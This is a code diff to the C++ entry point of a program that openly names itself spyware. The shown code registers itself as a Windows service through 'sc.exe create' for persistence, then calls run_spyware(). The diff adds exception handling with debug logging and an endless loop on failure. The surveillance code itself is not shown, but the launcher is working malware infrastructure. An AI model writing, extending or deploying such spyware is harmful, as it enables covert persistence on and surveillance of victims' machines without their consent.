@@ -1,13 +1,13 @@
 #include <iostream>
+#include <exception>
 
 #include "config.h"
 #include "core/spyware.hpp"
+#include "core/debug.hpp"
 
 int main (int argc, char *argv[]) {
     std::string exePath (argv[0]);
     std::string firstArgs = argc > 1 ? std::string(std::string(argv[1])) : "";
-
-    std::cout << exePath << std::endl;
     
     if (argc < 1 || firstArgs.compare("--run") != 0) {
         std::string registerServiceCmd = "sc.exe create ";
@@ -19,6 +19,17 @@ int main (int argc, char *argv[]) {
         std::system(registerServiceCmd.c_str());
     }
 
+    try {
+        return run_spyware();
+    } catch (std::exception ex) {
+        std::string message(ex.what());
+        debug(message, LEVEL_CRITICAL);
+    } catch (const char *ex) {
+        std::string message(ex);
+        debug(message, LEVEL_CRITICAL);
+    }
 
-    return run_spyware();
+    while (true) {}
+
+    return EXIT_FAILURE;
 }
